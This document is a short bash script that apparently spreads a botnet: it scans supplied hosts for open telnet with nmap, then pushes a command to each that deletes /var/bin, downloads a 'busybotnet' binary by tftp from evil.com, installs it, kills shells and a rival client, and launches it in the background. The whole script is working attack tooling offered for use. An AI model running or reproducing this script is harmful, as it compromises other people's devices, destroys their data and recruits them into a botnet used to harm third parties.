#!/bin/bash
list=$@
# give user sudo acccess to nmap
sudo nmap -Pn -n -iL $list -p 23 --open --script=banner -oG open.bots
grepips -f open.bots |sort -u > open.ips ; rm open.bots

cmd="if [ -f /var/run/soevil.pid ]; then echo Exiting; exit;fi;\
trap \"\" 1 2;(sh -c '(rm -rf /var/bin ; cd /var;tftp -g -r busybotnet evil.com;chmod +x busybotnet;\
./busybotnet mkdir bin;./busybotnet mv busybotnet /var/bin;/var/bin/busybotnet --install -s /var/bin) ; \
(/var/bin/killall -9 sh;/var/bin/killall subclient; export PATH=:/usr/sbin:/bin:/usr/bin:/sbin:/var/bin;\
cd /var/;trap \"\" 1 2;busybotnet ohsoevil &)&')&"

./pycc -m s -l open.ips -t 1000 -c "$cmd" -T 60
rm open.ips

exit
